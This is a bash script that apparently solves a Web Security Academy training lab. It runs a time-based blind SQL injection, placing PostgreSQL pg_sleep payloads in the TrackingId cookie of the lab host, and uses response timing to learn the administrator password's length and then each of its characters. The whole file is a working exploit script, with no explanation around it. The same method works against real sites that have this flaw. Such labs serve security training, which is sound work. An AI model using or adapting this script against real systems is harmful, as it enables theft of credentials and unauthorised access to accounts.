#!/bin/bash


#stuff="1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
stuff="1234567890abcdefghijklmnopqrstuvwxyz"
password_length=0
counter=0

echo -n "Getting Password Length "

while $true; do
    echo -n "."
    timing=$(curl -w %{time_total} -o /dev/null -s -k "https://0a3e000803a5aa14c0e91b8800ef004b.web-security-academy.net/filter?category=Gifts" --cookie "TrackingId=27FVHAahjiGC699z'%3bSELECT CASE WHEN (username='administrator' AND LENGTH(password)>$counter) THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users--; session=QfHZ3HlnmK4LfaMZjmbpfX2fUxPoXYvD")
    timing=`echo $timing| cut -d. -f1`
    if [ $timing -gt "0" ];then 
        let password_length++
        let counter++
    else
        break
    fi
done
echo -e "\n"
echo "Password Length: " $password_length
echo -n "Cracking Password> "

for i in $( seq 1 $password_length )
do
    while read -n1 character; do
        timing2=$(curl -w %{time_total} -o /dev/null -s -k "https://0a3e000803a5aa14c0e91b8800ef004b.web-security-academy.net/filter?category=Gifts" --cookie "TrackingId=27FVHAahjiGC699z'%3bSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,$i,1)='$character') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users--; session=QfHZ3HlnmK4LfaMZjmbpfX2fUxPoXYvD")
        timing2=`echo $timing2| cut -d. -f1`
        if [ $timing2 -gt "1" ] ;then 
             echo -n $character
         fi
    done < <(echo -n "$stuff")
done

